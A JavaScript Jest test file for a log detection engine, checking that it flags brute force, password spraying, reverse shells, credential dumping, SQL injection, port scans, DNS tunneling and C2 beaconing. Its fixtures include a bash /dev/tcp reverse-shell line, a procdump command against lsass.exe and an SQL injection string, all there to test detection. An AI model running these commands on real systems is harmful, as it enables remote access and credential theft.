'use strict';

const { runDetectionEngine } = require('../src/detection-engine/detectionEngine');

function authEvent({ ip, user, outcome, offsetSec }) {
  return {
    '@timestamp': new Date(Date.UTC(2026, 7, 19, 10, 0, offsetSec)).toISOString(),
    source: { ip },
    user: { name: user },
    event: { category: ['authentication'], outcome, action: 'ssh_login' },
  };
}

describe('detectAuthBehaviors via runDetectionEngine', () => {
  test('flags SSH brute force from a single source IP', () => {
    const events = Array.from({ length: 12 }, (_, i) => authEvent({ ip: '198.51.100.5', user: 'admin', outcome: 'failure', offsetSec: i * 5 }));
    const result = runDetectionEngine(events);
    const bruteForce = result.detections.find((d) => d.name.includes('Brute Force'));
    expect(bruteForce).toBeDefined();
    expect(bruteForce.severity).toMatch(/high|critical/);
    expect(bruteForce.mitre.techniqueId).toBe('T1110.001');
  });

  test('flags password spraying against many distinct usernames from one IP', () => {
    const users = ['alice', 'bob', 'carol', 'dave', 'erin', 'frank'];
    const events = users.map((u, i) => authEvent({ ip: '198.51.100.9', user: u, outcome: 'failure', offsetSec: i * 3 }));
    const result = runDetectionEngine(events);
    const spraying = result.detections.find((d) => d.name === 'Password Spraying');
    expect(spraying).toBeDefined();
  });

  test('flags success following repeated failures', () => {
    const events = [
      ...Array.from({ length: 4 }, (_, i) => authEvent({ ip: '203.0.113.9', user: 'root', outcome: 'failure', offsetSec: i * 2 })),
      authEvent({ ip: '203.0.113.9', user: 'root', outcome: 'success', offsetSec: 20 }),
    ];
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name.includes('Following Repeated Failures'))).toBeDefined();
  });

  test('does not flag brute force for normal low-volume logins', () => {
    const events = [authEvent({ ip: '10.0.0.5', user: 'jsmith', outcome: 'success', offsetSec: 0 })];
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name.includes('Brute Force'))).toBeUndefined();
  });
});

describe('detectLinuxBehaviors via runDetectionEngine', () => {
  test('flags reverse shell command patterns', () => {
    const events = [{ '@timestamp': new Date().toISOString(), message: 'bash -i >& /dev/tcp/203.0.113.55/4444 0>&1' }];
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name === 'Reverse Shell Indicator')).toBeDefined();
  });

  test('flags suspicious sudo usage', () => {
    const events = [{ '@timestamp': new Date().toISOString(), message: 'sudo /bin/bash' }];
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name === 'Suspicious sudo Usage')).toBeDefined();
  });
});

describe('detectWindowsBehaviors via runDetectionEngine', () => {
  test('flags encoded PowerShell execution', () => {
    const events = [
      {
        '@timestamp': new Date().toISOString(),
        process: { name: 'powershell.exe', command_line: 'powershell.exe -EncodedCommand SQBFAFgA' },
      },
    ];
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name === 'Encoded PowerShell Execution')).toBeDefined();
  });

  test('flags credential dumping indicators', () => {
    const events = [{ '@timestamp': new Date().toISOString(), process: { name: 'procdump.exe', command_line: 'procdump -ma lsass.exe lsass.dmp' } }];
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name === 'Potential Credential Dumping')).toBeDefined();
  });
});

describe('detectWebBehaviors via runDetectionEngine', () => {
  test('flags SQL injection attempts', () => {
    const events = [{ '@timestamp': new Date().toISOString(), url: { original: "/product?id=1' OR '1'='1" }, http: { request: { method: 'GET' } } }];
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name === 'SQL Injection Attempt')).toBeDefined();
  });
});

describe('detectNetworkBehaviors via runDetectionEngine', () => {
  test('flags port scanning from a single source across many ports', () => {
    const events = Array.from({ length: 20 }, (_, i) => ({
      '@timestamp': new Date(Date.UTC(2026, 7, 19, 10, 0, i)).toISOString(),
      source: { ip: '203.0.113.99' },
      destination: { ip: '10.0.0.10', port: 1000 + i * 7 },
    }));
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name === 'Port Scanning')).toBeDefined();
  });
});

describe('detectFirewallBehaviors via runDetectionEngine', () => {
  test('flags repeated denied connections', () => {
    const events = Array.from({ length: 15 }, (_, i) => ({
      '@timestamp': new Date(Date.UTC(2026, 7, 19, 10, 0, i)).toISOString(),
      source: { ip: '203.0.113.100' },
      destination: { ip: '10.0.0.11' },
      event: { action: 'denied' },
    }));
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name === 'Repeated Denied Firewall Connections')).toBeDefined();
  });

  test('flags high-volume internal-to-external traffic using the real CIDR evaluator', () => {
    const events = Array.from({ length: 25 }, (_, i) => ({
      '@timestamp': new Date(Date.UTC(2026, 7, 19, 10, 0, i)).toISOString(),
      source: { ip: '10.0.0.5' },
      destination: { ip: '203.0.113.200' },
      event: { action: 'allowed' },
    }));
    const result = runDetectionEngine(events);
    const anomaly = result.detections.find((d) => d.name === 'Internal-to-External Traffic Anomaly');
    expect(anomaly).toBeDefined();
    expect(anomaly.evaluatorResult.matched).toBe(true);
    expect(anomaly.evaluatorResult.evidence.sourceInternal).toBe(true);
    expect(anomaly.evaluatorResult.evidence.destinationInternal).toBe(false);
    expect(anomaly.ruleConditions).toEqual([
      { field: 'source.ip', cidr: { ranges: expect.any(Array), mode: 'in' } },
      { field: 'destination.ip', cidr: { ranges: expect.any(Array), mode: 'not_in' } },
    ]);
  });

  test('does not flag high-volume internal-to-internal traffic', () => {
    const events = Array.from({ length: 25 }, (_, i) => ({
      '@timestamp': new Date(Date.UTC(2026, 7, 19, 10, 0, i)).toISOString(),
      source: { ip: '10.0.0.5' },
      destination: { ip: '10.0.0.99' },
      event: { action: 'allowed' },
    }));
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name === 'Internal-to-External Traffic Anomaly')).toBeUndefined();
  });
});

describe('detectNetworkBehaviors: DNS tunneling and C2 beaconing via runDetectionEngine', () => {
  test('flags a group of long, high-entropy DNS queries under one domain', () => {
    const encodedLabels = [
      'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0',
      'z9y8x7w6v5u4t3s2r1q0p9o8n7m6l5k4j3i2h1g0',
      'm3n4o5p6q7r8s9t0a1b2c3d4e5f6g7h8i9j0k1l2',
    ];
    const events = encodedLabels.map((label, i) => ({
      '@timestamp': new Date(Date.UTC(2026, 7, 19, 10, 0, i)).toISOString(),
      source: { ip: '10.0.0.5' },
      dns: { question: { name: `${label}.exfil.example.net` } },
    }));
    const result = runDetectionEngine(events);
    const tunneling = result.detections.find((d) => d.name === 'Possible DNS Tunneling');
    expect(tunneling).toBeDefined();
    expect(tunneling.evaluatorResult.matched).toBe(true);
    expect(tunneling.evaluatorResult.evidence.sampleCount).toBe(3);
    expect(tunneling.ruleConditions).toEqual([{ field: 'dns.question.name', exists: true }]);
  });

  test('does not flag ordinary DNS queries', () => {
    const events = ['www.example.com', 'api.example.com', 'login.example.com'].map((name, i) => ({
      '@timestamp': new Date(Date.UTC(2026, 7, 19, 10, 0, i)).toISOString(),
      source: { ip: '10.0.0.5' },
      dns: { question: { name } },
    }));
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name === 'Possible DNS Tunneling')).toBeUndefined();
  });

  test('flags highly regular connection timing as possible C2 beaconing', () => {
    const base = Date.UTC(2026, 7, 19, 10, 0, 0);
    const events = Array.from({ length: 10 }, (_, i) => ({
      '@timestamp': new Date(base + i * 60_000).toISOString(),
      source: { ip: '10.0.0.5' },
      destination: { ip: '203.0.113.55', port: 443 },
    }));
    const result = runDetectionEngine(events);
    const beaconing = result.detections.find((d) => d.name === 'Possible C2 Beaconing');
    expect(beaconing).toBeDefined();
    expect(beaconing.evaluatorResult.matched).toBe(true);
    expect(beaconing.evaluatorResult.evidence.intervalMeanMs).toBe(60_000);
  });

  test('does not flag irregular connection timing', () => {
    const base = Date.UTC(2026, 7, 19, 10, 0, 0);
    const jitters = [5, 400, 12, 900, 20, 600, 1100, 8];
    let t = base;
    const events = [{ t }];
    for (const j of jitters) {
      t += j * 1000;
      events.push({ t });
    }
    const withDest = events.map(({ t: ts }) => ({
      '@timestamp': new Date(ts).toISOString(),
      source: { ip: '10.0.0.5' },
      destination: { ip: '203.0.113.55' },
    }));
    const result = runDetectionEngine(withDest);
    expect(result.detections.find((d) => d.name === 'Possible C2 Beaconing')).toBeUndefined();
  });
});
